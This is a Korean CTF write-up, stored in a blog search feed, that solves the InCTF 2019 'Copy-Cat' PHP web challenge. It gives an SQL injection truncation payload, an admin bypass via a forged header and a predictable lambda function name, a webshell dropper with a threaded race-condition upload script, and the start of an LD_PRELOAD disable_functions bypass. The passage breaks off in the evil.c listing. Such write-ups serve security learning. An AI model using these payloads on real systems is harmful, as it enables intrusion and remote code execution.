<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>InCTF 2019 Copy-Cat Write up</title>
      <link href="/2019/09/24/Web/%E3%84%B4%20WriteUps/%ED%85%8C%EC%8A%A4%ED%8A%B8%ED%85%8C%EC%8A%A4%ED%8A%B8/"/>
      <url>/2019/09/24/Web/%E3%84%B4%20WriteUps/%ED%85%8C%EC%8A%A4%ED%8A%B8%ED%85%8C%EC%8A%A4%ED%8A%B8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/39398965/65524775-5a1cc980-df29-11e9-9237-b9fed69bff27.png" alt="2019-09-24 오후 10-30-04"></p><p>해당 문제는 인도의 bi0s Team에서 주최한 <strong>InCTF 2019</strong>의 <strong>Copy-Cat</strong>이란 <strong>Web</strong> 문제입니다.</p><p>문제 풀면서 얻어간 것도 있고, 개인적으로는 해당 대회에서 가장 재밌게 푼 문제라 Write up을 작성하게 되었습니다.</p><hr><h1 id="문제분석"><a href="#문제분석" class="headerlink" title="문제분석"></a>문제분석</h1><p>문제 소스 :  <a href="https://github.com/JeonYoungSin/test/files/3652985/Copy-Cat.zip" target="_blank" rel="noopener">Copy-Cat.zip</a></p><p>해당 문제는 전체 소스코드를 제공해주는 화이트박스 형식의 문제였습니다. 소스코드 분석에 앞서 문제 사이트에 먼저 들어가보면 아래와 같이 간단한 로그인 기능만 보이는 것을 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65525784-07441180-df2b-11e9-9033-c8684693b5ff.png" alt="image"></p><p>해당 기능을 통해 뭘 해야하는지 다운받은 코드를 분석해보면 로그인 시 아래와 같은 형태로  <strong>계정명,비밀번호를 check 함수를 통해 검증</strong>하고 있는 것을 볼 수 있습니다.</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$user = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">$user = check($user);</span><br><span class="line">$pass = check($pass);   <span class="comment">//I know you are naughty!!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT username, password FROM inctf2019_cat WHERE username='"</span> .$user .<span class="string">"' &amp;&amp; password='"</span> .$pass .<span class="string">"'"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span> || $_SESSION[<span class="string">'logged'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$_SESSION[<span class="string">'logged'</span>] = <span class="number">1</span>;</span><br><span class="line">header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Incorrect Credentials"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>check 함수에서 수행하는 동작은 아래와 같습니다. 먼저 <strong>real_escape_string</strong> 함수를 통해 ‘,”,\ 와 같은 특수문자에 <strong>\ (backslash)</strong>를 추가해 SQL Injection을 방어한 뒤 길이 값을 확인해 5~11 글자의 입력 값만 받는 것을 볼 수 있습니다.  </p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $conn;</span><br><span class="line">    $str = $conn-&gt;real_escape_string($str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($tocheck)</span></span>&#123;</span><br><span class="line">  $tocheck = trim(escape($tocheck));</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"For God Sake, don't try to HACK me!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    $tocheck = substr($tocheck, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $tocheck;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>여기서 해당 코드를 주의깊게 보면 <strong>입력 값의 길이가 11글자보다 크면 substr를 통해 입력 값을 자르는 걸 볼 수 있는데, 이를 통해  real_escape_string 함수를 통해 추가된 backslash를 무력화시켜 SQL Injetcion을 수행</strong>할 수 있게 됩니다. 공격 원리는 아래와 같습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = 1234567890\ -&gt; real_escape_string  -&gt; 1234567890\\ -&gt; substr(1234567890\\,0,11) -&gt; 1234567890\</span><br></pre></td></tr></table></figure><p>위와 같이 substr을 통해 최종적으로 real_escape_string를 통해 추가된 \를 제거할 수 있고 추가로 password에 인젝션 구문을 넣어주면 <strong>SQL Injection을 통해 참 값</strong>을 만들 수 있게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">username = 1234567890\ , password =   or 1#</span><br><span class="line"></span><br><span class="line">result</span><br><span class="line">$sql = &quot;SELECT username, password FROM inctf2019_cat WHERE username=&apos;1234567890\&apos; &amp;&amp; password=&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure><hr><p>이제 해당 payload로 로그인에 성공해 admin.php 페이지에 가게되면 “<strong>Sorry, It seems you are not Admin…are you? If yes, proove it then !!</strong>“ 란 메시지가 저희를 반겨줍니다. 뭐가 문젠지 코드를 다시보면 </p><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="string">"True"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Sorry, It seems you are not Admin...are you? If yes, proove it then !!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>세션에 admin 값이 True로 세팅되어 있어야 하는 것을 볼 수 있습니다. 그럼 이제 해당 값이 언제 True로 세팅되는지 전체 코드에서 검색해보면 아래와 같은 형태의 로직이 존재하는 것을 볼 수 있습니다.</p><p><strong>remote_admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"functions.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line"></span><br><span class="line"><span class="comment"># If admin wants to open his website remotely</span></span><br><span class="line"></span><br><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function admin_$random() &#123;"</span></span><br><span class="line">  .<span class="string">"global \$remote_admin; \$remote_admin();"</span></span><br><span class="line">  .<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">send($random);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'random'</span>]();    <span class="comment">//Only Admin knows next random value; You don't have to worry about HOW?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'admin'</span>] = <span class="string">"True"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 분석해보면 <code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>를 통해 해당 페이지에 접근한 아이피가 127.0.0.1일 때만 세션 내 admin 값을 True로 세팅되는걸 볼 수 있습니다. 이를 가능하게 하려면 <code>$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]</code> 의 값을 127.0.0.1로 덮은 후 <code>create_function</code>을 통해 생성된 함수를 호출해주면 됩니다.</p><p>함수 호출과 같은 경우 PHP에선<strong><code>&quot;문자열&quot;();</code></strong> 형태로 함수 호출이 가능하기 때문에 <strong><code>$_GET[&#39;random&#39;]();</code></strong> 코드를 통해 함수 호출이 가능합니다. 이를 토대로 함수를 호출하려고 보면, <strong><code>create_function 함수를 통해 생성된 익명함수는 변수형태로 존재해 문자열 형태로 호출이 불가</code></strong>하고, 해당 함수를 호출해주는 <strong><code>admin_$random 함수는 $random 값이 랜덤한 값으로 요청시마다 세팅</code></strong>되기 때문에 호출이 불가한 것을 볼 수 있습니다.</p><p>이를 우회하기 위해 이것저것 생각해보다 php create_function의 소스코드를 분석해보았고 아래와 같은 사실을 알 수 있었습니다.</p><p><strong>zend_builtin_function.c</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define LAMBDA_TEMP_FUNCNAME"__lambda_func"</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span></span><br><span class="line"><span class="comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span></span><br><span class="line">ZEND_FUNCTION(create_function)</span><br><span class="line">&#123;</span><br><span class="line"> ..생략..</span><br><span class="line"></span><br><span class="line">function_name = zend_string_alloc(sizeof(<span class="string">"0lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ZSTR_LEN(function_name) = snprintf(ZSTR_VAL(function_name) + <span class="number">1</span>, sizeof(<span class="string">"lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="string">"lambda_%d"</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="keyword">NULL</span>);</span><br><span class="line">RETURN_NEW_STR(function_name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, sizeof(LAMBDA_TEMP_FUNCNAME)<span class="number">-1</span>);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드를 보면 <code>create_function 함수 호출 후 반환되는 값이 \x00lambda_%d 형태</code>인 것을 확인할 수 있었고, 실제 로컬에서 테스트해본결과 <strong><code>\x00lambda\_1,\x00lambda_2</code></strong> 형태의 문자열 형태로 익명 함수 name이 반환되는 걸 볼 수 있었습니다.</p><p>그럼 다시 문제코드로 돌아와, 우리는 아래와 같이 <code>$remote_admin</code> 변수에 담기는 <strong><code>익명 함수명의 문자열 값을 예측</code></strong>할 수 있기 때문에  <code>admin_$random() 함수의 호출 없이 익명 함수를 호출해 관리자 권한을 획득</code>할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_admin.php?random=%00lambda_1 HTTP/1.1</span><br><span class="line">Host: 3.15.186.158</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">I-AM-ADMIN: 127.0.0.1</span><br><span class="line">Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=2grnkh3472812hpf3jg4p2m5g6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><hr><p>이제 admin 권한을 획득한 뒤 admin페이지에 다시 접근 하면 아래와 같은 <strong>업로드 기능</strong>이 존재합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65532094-2e541080-df36-11e9-9231-a10bd6a7fab5.png" alt="image"></p><p>해당 기능을 수행하는 코드는 다음과 같습니다.</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line">is_admin();</span><br><span class="line"></span><br><span class="line">$SANDBOX = getcwd() . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">  ExtractZipFile($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $SANDBOX);</span><br><span class="line">  CheckDir($SANDBOX);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"File is at: "</span> . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span><span class="params">($file,$path)</span></span>&#123;</span><br><span class="line">  $zip = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> ($zip-&gt;open($file) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    $zip-&gt;extractTo($path);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $files = scandir($path);</span><br><span class="line">    <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        $filepath = <span class="string">"$path/$file"</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file($filepath)) &#123;</span><br><span class="line">            $parts = pathinfo($file);</span><br><span class="line">            $ext = strtolower($parts[<span class="string">'extension'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($ext, <span class="string">'php'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'pl'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'py'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'cgi'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'asp'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'js'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'rb'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">strpos($ext, <span class="string">'htaccess'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'jar'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink($filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($file != <span class="string">'.'</span> &amp;&amp; $file != <span class="string">'..'</span> &amp;&amp; is_dir($filepath)) &#123;</span><br><span class="line">            CheckDir($filepath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드 흐름은 다음과 같습니다.</p><p>업로드한 Zip 파일 압축 해제 -&gt; ./uploads/md5_hex_value/ 디렉토리에 압축된 파일들 생성 -&gt; 생성된 파일들의 확장자를 검증해 필터 대상인 경우 삭제</p><p>위 흐름대로라면 <strong>파일 생성 후 삭제</strong>가 이루어지며, 생성될 <strong>파일명 및 경로가 고정</strong>되어 있기 때문에 <strong>Race Condition</strong>이 가능해 집니다.</p><p>이를 통해 파일 업로드 마다 삭제되는 <strong>php 확장자 파일 호출이 가능</strong>해지며, <strong>웹쉘 업로드</strong>가 가능해집니다.</p><p>Race Condition 시 사용한 코드는 아래와 같습니다.</p><p><strong>youngsin.php</strong> (해당 파일을 압축해 youngsin.zip 생성)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">mkdir(<span class="string">"../youngsin/"</span>);</span><br><span class="line">file_put_contents(<span class="string">"../youngsin/webshell.php"</span>,<span class="string">'&lt;?php eval($_GET[0]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"WebShell Path = "</span>.getcwd().<span class="string">"/../youngsin/webshell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>raceCondition.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_zip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/upload.php"</span></span><br><span class="line">        multiple_files = [</span><br><span class="line">            (<span class="string">'file'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'C:\Users\Administrator\Desktop/1/youngsin.zip'</span>,<span class="string">"rb"</span>), <span class="string">'application/x-zip-compressed'</span>))]</span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result =  requests.post(url,headers=header,files=multiple_files).text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/youngsin.php"</span></span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result = requests.get(url, headers=header).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"404 Not Found"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    threading.Thread(target=upload_zip,args=(<span class="string">''</span>)).start()</span><br><span class="line">    threading.Thread(target=get_shell, args=(<span class="string">''</span>)).start()</span><br></pre></td></tr></table></figure><p>Result<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebShell Path = /var/www/html/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/../youngsin/webshell.php</span><br></pre></td></tr></table></figure></p><p>생성된 웹쉘에 접근해보면 <strong>정상적으로 웹쉘이 업로드</strong>된걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65533542-cb17ad80-df38-11e9-9b9e-368db0463a8e.png" alt="image"></p><hr><p>이제 웹쉘까지 올렸겠다 그냥 플래그 파일 읽으면 될 것 같지만 <strong>플래그 파일의 권한이 오직 실행권한만 존재</strong>하기 때문에 <strong>단순 File Function으로는 플래그를 획득할 수 없고 쉘을 따야했습니다.</strong></p><p>그럼 이제 쉘을 따기위해 호출가능한 함수를 찾아야하는데 <strong><code>disable_functions</code></strong>이 다음과 같이 세팅되어 있었습니다.</p><p><strong>disable_functions</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,proc_open,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir</span><br></pre></td></tr></table></figure><p>일단 기본적으로 <strong>php에서 지원하는 모든 쉘 관련 함수가 막혀</strong>있는걸 볼 수 있었습니다. 추가로 시도해볼만한 <strong>LD_PRELOAD</strong>를 이용한 기법과 같은 경우  <strong>putenv는 활성화</strong> 되어있지만 내부적으로 <strong>execve를 호출</strong>하는걸로 알려져있는 <strong>mail,imap_open,error_log,syslog가 막혀</strong>있었고, <strong>imagick 모듈과 같은 경우 따로 설치되어 있지 않아 사용이 불가</strong>했습니다.</p><p>여기서 추가로 다른방법같은게 있나 유심히 phpinfo 페이지를 확인하다보면 <strong>mbstring라는 확장 모듈이 설치</strong>되어 있는걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534295-18484f00-df3a-11e9-937d-4e9b29a2eab6.png" alt="image"></p><p>해당 모듈이 설치된 경우 <strong>Multibyte character encoding을 지원하는 함수들 사용이 가능</strong>한데, 사용 가능한 함수 중 아래와 같이 <strong>mail함수와 매칭되는 mb_send_mail이 존재</strong>합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534875-38c4d900-df3b-11e9-807a-fa6827ba3945.png" alt="image"></p><p>해당 함수와 같은 경우 인코딩 부분을 제외하곤 mail함수와 동일한 형태로 수행될 것이기 때문에 <strong>내부적으로 execve를 통한 sendmail 호출</strong>이 이루어지고, <strong>disable_function에는 적용이 되어있지 않아 LD_PRELOAD 기법을 통해 쉘 획득</strong>이 가능해집니다.</p><p>LD_PRELOAD를 통해 쉘을 획득하는 방식은 간단하게 설명하면 아래와 같습니다.</p><ol><li>execve를 오버라이딩하는 공유 라이브러리 생성 (ex: gcc -shared -fPIC evil.c -o evil.so)</li><li>so 파일 업로드</li><li>php의 putenv를 통해 업로드한 so 파일을 LD_PRELOAD로 등록</li><li>php에서 내부적으로 execve를 호출하는 함수(ex:mail,imap_open,error_log 등) 호출</li></ol><p>추가적으로 해당 기법에 대해 궁금하신분들은 구글에 <strong>php ld_preload bypass</strong> 와 같은 형태로 검색하시면 좋은 자료가 많으니 참고해주시면 될 것 같습니다.</p><p>위 공격과정을 수행할 코드는 아래와 같습니다.</p><p><strong>evil.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 